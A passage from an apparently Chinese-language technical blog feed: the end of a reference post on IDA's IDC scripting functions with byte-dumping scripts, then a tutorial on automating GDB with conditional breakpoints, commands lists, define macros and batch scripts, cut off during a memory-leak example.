flags)</span></span></span><br></pre></td></tr></table></figure><p>取消位于指定地址的顶的定义。这里的表示（参见<strong>IDC</strong>的<strong>MakeUnkn</strong>文档）指出是否也取消随后的项的定义，以及是否删除任何与取消定义的项有关的名称。相关函数<strong>MakeUnknown</strong>允许你取消大块数据的定义</p><h3 id="02-MakeCode"><a href="#02-MakeCode" class="headerlink" title="02 MakeCode"></a>02 MakeCode</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">MakeCode</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure><p>将位于指定地址的字节转换成一条指令。如果操作成功，则返回指令的长度，否则返回0</p><h3 id="03-MakeByte"><a href="#03-MakeByte" class="headerlink" title="03 MakeByte"></a>03 MakeByte</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">MakeByte</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure><p>将位于指定地址的项目转换成一个数据字节。类似的函数还包括<strong>MakeWord</strong>和<strong>MakeDword</strong></p><h3 id="04-MakeComm"><a href="#04-MakeComm" class="headerlink" title="04 MakeComm"></a>04 MakeComm</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">MakeComm</span><span class="params">(<span class="keyword">long</span> addr, <span class="built_in">string</span> comment)</span></span></span><br></pre></td></tr></table></figure><p>在给定的地址处添加一条常规注释</p><h3 id="05-MakeFunction"><a href="#05-MakeFunction" class="headerlink" title="05 MakeFunction"></a>05 MakeFunction</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">MakeFunction</span><span class="params">(<span class="keyword">long</span> begin, <span class="keyword">long</span> end)</span></span></span><br></pre></td></tr></table></figure><p>将由<strong>begin</strong>到<strong>end</strong>的指令转换成一个函数。如果<strong>end</strong>被指定为<strong>BADADDR(-1)</strong>，<strong>IDA</strong>会尝试通过定位函数的返回指令，来自动确定该函数的结束地址</p><h3 id="06-MakeStr"><a href="#06-MakeStr" class="headerlink" title="06 MakeStr"></a>06 MakeStr</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">MakeStr</span><span class="params">(<span class="keyword">long</span> begin, <span class="keyword">long</span> end)</span></span></span><br></pre></td></tr></table></figure><p>创建一个当前字符串(有<strong>GetStringType</strong>返回)类型的字符串，涵盖由<strong>begin</strong>到<strong>end-1</strong>之间的所有字节。如果<strong>end</strong>被指定为<strong>BADADDR(-1)</strong>，<strong>IDA</strong>会尝试自动确定字符串的结束位置</p><h2 id="0x10-数据库搜索函数"><a href="#0x10-数据库搜索函数" class="headerlink" title="0x10 数据库搜索函数"></a>0x10 数据库搜索函数</h2><p>在<strong>IDA</strong>中<strong>Find</strong>系列函数中的<strong>flags</strong>参数是一个位掩码，可用于指定查找操作的行为。3个最为常用的标志分别为<strong>SEARCH_DOWN</strong>，它指示搜索操作扫描高位地址；<strong>SEARCH_NEXT</strong>，它略过当前匹配项，以搜索下一个匹配项；<strong>SEARCH_CASE</strong>，它以区分大小写的方式进行二进制和文本搜索</p><h3 id="01-FindCode"><a href="#01-FindCode" class="headerlink" title="01 FindCode"></a>01 FindCode</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">FindCode</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> flags)</span></span></span><br></pre></td></tr></table></figure><p>从给定的地址搜索一条指令</p><h3 id="02-FindData"><a href="#02-FindData" class="headerlink" title="02 FindData"></a>02 FindData</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">FindData</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> flags)</span></span></span><br></pre></td></tr></table></figure><p>从给定的地址搜索一个数据项</p><h3 id="03-FindBinary"><a href="#03-FindBinary" class="headerlink" title="03 FindBinary"></a>03 FindBinary</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">FindBinary</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> flags, <span class="built_in">string</span> binary)</span></span></span><br></pre></td></tr></table></figure><p>从给定的地址搜索一个字节序列。字符<strong>binary</strong>指定一个十六进制字节序列值。如果没有设置<strong>SEARCH_CASE</strong>，且一个字节值指定了一个大写或小写<strong>ASCII</strong>字母，则搜索仍然会匹配对应的互补值。例如，”41 42”将匹配”61 62”和”61 42”，除非你设置了<strong>SEARCH_CASE</strong>标志位</p><h3 id="04-FindText"><a href="#04-FindText" class="headerlink" title="04 FindText"></a>04 FindText</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">FindText</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> flags, <span class="keyword">long</span> row, <span class="keyword">long</span> column, <span class="built_in">string</span> text)</span></span></span><br></pre></td></tr></table></figure><p>在给定的地址，从给定行（<strong>row</strong>）的给定列搜索字符串<strong>text</strong>。注意，某个给定地址的反汇编文本可能会跨越几行，因此，你需要指定搜索应从哪一行开始</p><h2 id="0x11-反汇编行组件"><a href="#0x11-反汇编行组件" class="headerlink" title="0x11 反汇编行组件"></a>0x11 反汇编行组件</h2><h3 id="01-GetDisasm"><a href="#01-GetDisasm" class="headerlink" title="01 GetDisasm"></a>01 GetDisasm</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">GetDisasm</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure><p>返回给定地址的反汇编文本。反回的文本包括任何注释，但不包括地址信息</p><h3 id="02-GetMnem"><a href="#02-GetMnem" class="headerlink" title="02 GetMnem"></a>02 GetMnem</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">GetMnem</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure><p>返回位于给定地址的指令的助记符部分</p><h3 id="03-GetOpnd"><a href="#03-GetOpnd" class="headerlink" title="03 GetOpnd"></a>03 GetOpnd</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">GetOpnd</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> opnm)</span></span></span><br></pre></td></tr></table></figure><p>返回指定地址的指定操作数的文本形式。IDA以零为起始编号，从左向右对操作数编号</p><h3 id="04-GetOpType"><a href="#04-GetOpType" class="headerlink" title="04 GetOpType"></a>04 GetOpType</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">GetOpType</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> opnum)</span></span></span><br></pre></td></tr></table></figure><p>返回一个整数，指出给定地址的给定操作数的类型。请参考<strong>IDC</strong>文档，了解操作数类型代码</p><h3 id="05-GetOperandValue"><a href="#05-GetOperandValue" class="headerlink" title="05 GetOperandValue"></a>05 GetOperandValue</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">GetOperandValue</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> opnum)</span></span></span><br></pre></td></tr></table></figure><p>返回与给定地址的给定操作数有关的整数值。返回值的性质取决于<strong>GetOpType</strong>指定的给定操作数的类型</p><h3 id="06-CommentEx"><a href="#06-CommentEx" class="headerlink" title="06 CommentEx"></a>06 CommentEx</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">CommentEx</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> type)</span></span></span><br></pre></td></tr></table></figure><p>返回给定地址处的注释文本。如果哦type为0，则返回常规注释的文本；如果type为1，则返回可重复注释的文本。如果给定地址处没有注释，则返回一个空字符串</p><h2 id="脚本示例"><a href="#脚本示例" class="headerlink" title="脚本示例"></a>脚本示例</h2><h3 id="IDC脚本"><a href="#IDC脚本" class="headerlink" title="IDC脚本"></a>IDC脚本</h3><p>实现的功能是导出一段内存的数据为数组形式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> str_addr,end_addr,dat;</span><br><span class="line">str_addr = <span class="number">0x00413CD2</span>;</span><br><span class="line">end_addr = <span class="number">0x00413D1C</span>;</span><br><span class="line">dat = end_addr - str_addr;</span><br><span class="line"><span class="keyword">auto</span> i = <span class="number">0</span>;</span><br><span class="line">Message(<span class="string">"["</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;dat;i++)&#123; </span><br><span class="line">    <span class="keyword">if</span>(i != dat<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Message(<span class="string">"%d ,"</span>,Byte(str_addr+i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">         Message(<span class="string">"%d"</span>,Byte(str_addr+i));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Message(<span class="string">"]"</span>);</span><br></pre></td></tr></table></figure><h3 id="IDAPython脚本"><a href="#IDAPython脚本" class="headerlink" title="IDAPython脚本"></a>IDAPython脚本</h3><p>功能同上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line">data = []</span><br><span class="line">model = <span class="string">"db"</span></span><br><span class="line">str_addr = <span class="number">0x00413CD2</span></span><br><span class="line">end_addr = <span class="number">0x00413D1C</span></span><br><span class="line">dat = end_addr - str_addr</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(dat):</span><br><span class="line">    <span class="keyword">if</span> model == <span class="string">"db"</span>:</span><br><span class="line">        data.append(Byte(str_addr + i))</span><br><span class="line">    <span class="keyword">if</span> model == <span class="string">"dw"</span>:</span><br><span class="line">        data.append(Word(str_addr + i))</span><br><span class="line">    <span class="keyword">if</span> model == <span class="string">"dd"</span>:</span><br><span class="line">        data.append(Dword(str_addr + i))</span><br><span class="line"><span class="keyword">print</span> data</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GDB自动化脚本编写笔记一</title>
      <link href="/2019/12/02/GDB%E2%95%AB%E2%95%98%E2%95%A2%C2%BB%E2%95%97%C2%BB%E2%95%9C%E2%94%BC%E2%96%92%E2%95%9B%E2%96%92%CE%B1%E2%95%A8%E2%94%A4%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F%E2%95%A5%E2%95%97/"/>
      <url>/2019/12/02/GDB%E2%95%AB%E2%95%98%E2%95%A2%C2%BB%E2%95%97%C2%BB%E2%95%9C%E2%94%BC%E2%96%92%E2%95%9B%E2%96%92%CE%B1%E2%95%A8%E2%94%A4%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F%E2%95%A5%E2%95%97/</url>
      
        <content type="html"><![CDATA[<p>作为UNIX/Linux下使用广泛的调试器，gdb不仅提供了丰富的命令，还引入了对脚本的支持：一种是对已存在的脚本语言支持，比如python，用户可以直接书写python脚本，由gdb调用python解释器执行；另一种是命令脚本，用户可以在脚本中书写gdb已经提供的或者自定义的gdb命令，再由gdb执行</p><p>我们通常都是在交互模式下使用 GDB 的，即手动输入各种 GDB 命令。其实 GDB 也支持执行预先写好的调试脚本，进行自动化的调试。调试脚本由一系列的 GDB 命令组成，GDB 会顺序执行调试脚本中的命令</p><h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>下面是一个带bug的二分查找实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binary_search</span><span class="params">(<span class="keyword">int</span> *ary, <span class="keyword">unsigned</span> <span class="keyword">int</span> ceiling, <span class="keyword">int</span> target)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">floor</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (ceiling &gt; <span class="built_in">floor</span>) &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> pivot = (ceiling + <span class="built_in">floor</span>) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (ary[pivot] &lt; target)</span><br><span class="line">            <span class="built_in">floor</span> = pivot + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ary[pivot] &gt; target)</span><br><span class="line">            ceiling = pivot - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> pivot;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; binary_search(a, <span class="number">5</span>, <span class="number">7</span>) &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// -1</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; binary_search(a, <span class="number">5</span>, <span class="number">6</span>) &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 4</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; binary_search(a, <span class="number">5</span>, <span class="number">5</span>) &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 期望3，实际运行结果是-1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你打算调试下<code>binary_search(a, 5, 5)</code>这个组合。若如果用print大法，就在<code>binary_search</code>中插入几个print，运行后扫一眼，看看<code>target=5</code>的时候运行流是怎样的</p><p>debugger大法看似会复杂一点，如果在<code>binary_search</code>中插断点，那么前两次调用只能连按<code>c</code>跳过。其实没那么复杂，gdb允许用户设置条件断点。你可以这么设置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b binary_search <span class="keyword">if</span> target == <span class="number">5</span></span><br></pre></td></tr></table></figure><p>现在就只有第三次调用会触发断点</p><p>问题看上去跟<code>floor</code>和<code>ceiling</code>值的变化有关。要想观察它们的值，可以<code>p floor</code>和<code>p ceiling</code>。不过有个简单的方法，你可以对它们设置watch断点：<code>wa floor if target == 5</code>。当<code>floor</code>的值变化时，就会触发断点</p><p>对于我们的示例程序来说，靠脑补也能算出这两个值的变化，专门设置断点似乎小题大做。不过在调试真正的程序时，watch断点非常实用，尤其当你对相关代码不熟悉时。使用watch断点可以更好地帮助你理解程序流程，有时甚至会有意外惊喜。另外结合debugger运行时修改值的能力，你可以在值变化的下一刻设置目标值，观察走不同路径会不会出现类似的问题。如果有需要的话，还可以给某个内存地址设断点：<code>wa *0x7fffffffda40</code></p><p>除了watch之外，gdb还有一类catch断点，可以用来捕获异常/系统调用/信号。因为用途不大（我从没实际用过），就不介绍了，感兴趣的话在gdb里面<code>help catch</code>看看</p><h2 id="commands"><a href="#commands" class="headerlink" title="commands"></a>commands</h2><p>编写调试脚本时必须要处理好断点的问题。在交互模式下，程序执行至脚本时，GDB 会等待用户输入下一步的命令。如何在脚本中定义断点触发时进行的操作？这需要一种类似回调函数的机制</p><p>GDB 中使用 <strong>Breakpoint Command Lists</strong> 的机制来实现这一点，可以给某个断点挂上待触发的命令。用户可以定义，当程序停在某个 breakpoint (或 watchpoint, catchpoint) 时，执行由 <code>command-list</code> 定义的一系列命令。其语法为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">commands [<span class="built_in">list</span>…]</span><br><span class="line">… command-<span class="built_in">list</span> …</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>例如，我想在每次进入 <code>foo</code> 函数且其参数 <code>x</code> &gt; 0 时打印 <code>x</code> 的值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">break</span> foo <span class="keyword">if</span> x&gt;<span class="number">0</span></span><br><span class="line">commands</span><br><span class="line">silent</span><br><span class="line"><span class="built_in">printf</span> <span class="string">"x is %d\n"</span>,x</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>这里有几点要注意的：</p><ul><li>Breakpoint command list 中的第一个命令通常是 <code>silent</code>。这会让断点触发是打印的消息尽量精简。如果 <code>command … end</code> 中没有 <code>printf</code> 之类的打印语句，断点触发时甚至不会产生任何输出</li><li>Breakpoint command list 中的最后一个命令通常是 <code>continue</code>。这样程序不会在断点处停下，自动化调试脚本可以继续执行</li></ul><p>GDB 运行自动化调试脚本的方式为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb [program] -batch -x [commands_file] &gt; <span class="built_in">log</span></span><br></pre></td></tr></table></figure><p>其中 <code>-batch</code> 参数将 GDB 运行为脚本模式（不进入交互环境），<code>-x</code> 参数 (也可以写为 <code>-command</code>) 指定调试脚本文件</p><h2 id="define"><a href="#define" class="headerlink" title="define"></a>define</h2><p>举个例子，继续上面的二分查找操作<code>b binary_search if target == 5</code>之后，输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">comm</span><br><span class="line">i locals</span><br><span class="line">i args</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>按照之前的格式也可以是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b binary_search if target == 5</span><br><span class="line">commands</span><br><span class="line">silent</span><br><span class="line">i locals</span><br><span class="line">i args</span><br><span class="line">continue</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>这样当上面的断点被触发时，<code>i locals</code>和<code>i args</code>命令会被触发，列出当前上下文内的变量。这个功能挺废的，因为你完全可以在断点被触发后才敲入这几个命令</p><p>要不是有<code>define</code>，<code>commands</code>就真成摆设了。接下来我们要介绍<code>commands</code>的好基友、最强大的gdb命令之一，<code>define</code>命令</p><p>一如unix世界里面的许多程序一样，gdb内部实现了一门DSL（领域特定语言）。用户可以通过这门DSL来编写自定义的宏，甚至编写调试用的自动化脚本。我们可以用<code>define</code>命令编写自定义的宏</p><p>继续上面的例子，你可以自定义一个命令代替<code>b xxx comm ...</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) define br_info</span><br><span class="line">Type commands <span class="keyword">for</span> definition of <span class="string">"br_info"</span>.</span><br><span class="line">End with a line saying just <span class="string">"end"</span>.</span><br><span class="line">&gt;b $arg0</span><br><span class="line">&gt;comm</span><br><span class="line">&gt;i locals</span><br><span class="line">&gt;i args</span><br><span class="line">&gt;end</span><br><span class="line">(gdb) br_info binary_search <span class="keyword">if</span> target == <span class="number">5</span></span><br></pre></td></tr></table></figure><p>当<code>if target == 5</code>条件满足时，<code>br_info binary_search</code>会被执行。<code>br_info</code>展开成为一系列命令，并用<code>binary_search</code>替换掉<code>$arg0</code>。一行顶过去五行</p><p>其实<code>define</code>也就是自定义命令，格式是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">define commandName  </span><br><span class="line">    statement  </span><br><span class="line">    ......  </span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>其中<code>statement</code>可以是任意gdb命令。此外自定义命令还支持最多10个输入参数：<code>$arg0</code>，<code>$arg1</code> …… <code>$arg9</code>，并且还用<code>$argc</code>来标明一共传入了多少参数</p><p>则上面的命令可以写为脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">define br_info</span><br><span class="line">b $arg0</span><br><span class="line">commands</span><br><span class="line">silent</span><br><span class="line">i locals</span><br><span class="line">i args</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>除了在会话内创建自定义宏外，我们还可以用gdb的DSL编写宏文件，并导入到gdb中</p><p>举个有实际意义的例子。由于源代码的改变，我们需要更新断点的位置。通常的做法是删掉原来的断点，并新设一个。让我们现学现用，用宏把这两步合成一步：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># gdb_macro</span><br><span class="line">define mv</span><br><span class="line">    <span class="keyword">if</span> $argc == <span class="number">2</span> # argc即总参数个数</span><br><span class="line">        <span class="keyword">delete</span> $arg0 # arg0即第一个参数</span><br><span class="line">        # 注意新创建的断点编号和被删除断点的编号不同</span><br><span class="line">        <span class="keyword">break</span> $arg1 # arg1即第二个参数</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        print <span class="string">"输入参数数目不对，help mv以获得用法"</span></span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"># (gdb) help mv 会输出以下帮助文档</span><br><span class="line">document mv</span><br><span class="line">Move breakpoint.</span><br><span class="line">Usage: mv old_breakpoint_num new_breakpoint</span><br><span class="line">Example:</span><br><span class="line">    (gdb) mv <span class="number">1</span> binary_search -- move breakpoint <span class="number">1</span> to `b binary_search`</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line"># vi:<span class="built_in">set</span> ft=gdb ts=<span class="number">4</span> sw=<span class="number">4</span> et</span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b binary_search</span><br><span class="line">Breakpoint 1 at 0x40083b: file binary_search.cpp, line 7.</span><br><span class="line">(gdb) source ~/gdb_macro</span><br><span class="line">(gdb) help mv</span><br><span class="line">Move breakpoint.</span><br><span class="line">Usage: mv old_breakpoint_num new_breakpoint</span><br><span class="line">Example:</span><br><span class="line">    (gdb) mv 1 binary_search -- move breakpoint 1 to `b binary_search`</span><br><span class="line"></span><br><span class="line">(gdb) mv 1 binary_search.cpp:18</span><br><span class="line">Breakpoint 2 at 0x4008ab: file binary_search.cpp, line 18.</span><br></pre></td></tr></table></figure><p>在gdb中执行脚本要使用source命令，例如：“source xxx.gdb”</p><p>还可以进一步，把<code>source ~/gdb_macro</code>也省掉。你可以创建gdb配置文件<code>~/.gdbinit</code>，让gdb启动时自动执行里面的指令。如果把自己常用的宏写在该文件中，就能直接在gdb里面使用了，用起来如内置命令一般顺滑</p><h2 id="document"><a href="#document" class="headerlink" title="document"></a>document</h2><p>除此以外，还可以为自定义命令写帮助文档，也就是执行<code>help</code>命令时打印出的信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document myassign</span><br><span class="line">    assign the second parameter value to the first parameter</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="会话-历史-命令文件"><a href="#会话-历史-命令文件" class="headerlink" title="会话/历史/命令文件"></a>会话/历史/命令文件</h2><p>通常我们只有在程序出问题才会启动gdb，开始调试工作，调试完毕后退出。不过，让gdb一直开着未尝不是更好的做法。每个gdb老司机都懂得，gdb在<code>r</code>的时候会加载当前程序的最新版本。也即是说，就算不退出gdb，每次运行的也会是当前最新的版本。不退出当前调试会话有两个好处：</p><ol><li>调试上下文可以得到保留。不用每次运行都重新设一轮断点</li><li>一旦core dump了，可以显示core dump的位置，无需带着core重新启动一次</li></ol><p>在开发C/C++项目，我一般是这样的工作流程：一个窗口开着编辑器，编译也在这个窗口执行；另一个窗口开着gdb，这个窗口同时也用来运行程序。一旦要调试了（或者，又segment fault了），随手就可以开始干活</p><p>当然了，劳作一天之后，总需要关电脑回家。这时候只能退出gdb。不想明天一早再把断点设上一遍？gdb提供了保留断点的功能。输入<code>save br .gdb_bp</code>，gdb会把本次会话的断点存在<code>.gdb_bp</code>中。明天早上一回来，启动gdb的时候，加上<code>-x .gdb_bp</code>，让gdb把<code>.gdb_bp</code>当做命令文件逐条重新执行，一切又回到昨晚</p><h2 id="调试脚本"><a href="#调试脚本" class="headerlink" title="调试脚本"></a>调试脚本</h2><p>提到用<code>-x</code>指定命令文件来回放断点。那时的命令文件也算是一种用gdb的DSL编写的调试脚本。由于调试是件交互性的活，需要事先写好调试脚本的场景不多。即使如此，除了让gdb自动设置断点，依然有不少场景下可以用上调试脚本。其中之一，就是让gdb自动采集特定函数调用的上下文数据。我把这种方法称为“拖网法”，因为它就像拖网捕鱼一样，把逮到的东西都一股脑带上来</p><p>设想如下的情景：某个项目出现内存泄露的迹象。事先分配好的内存池用着用着就满了，一再地吞噬系统的内存。内存管理是自己实现的，所以无法用valgrind来分析。鉴于内存管理部分代码最近几个版本都没有改动过，猜测是业务逻辑代码里面有谁借了内存又不还。现在你需要把它揪出来。一个办法是给内存的分配和释放加上日志，再编译，然后重新运行程序，谋求复现内存泄露的场景。不过更快的办法是，敲上这一段代码：</p><p>（假设分配内存的接口是<code>my_malloc(char *p, size_t size)</code>，释放内存的接口是<code>free(char *p)</code>）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 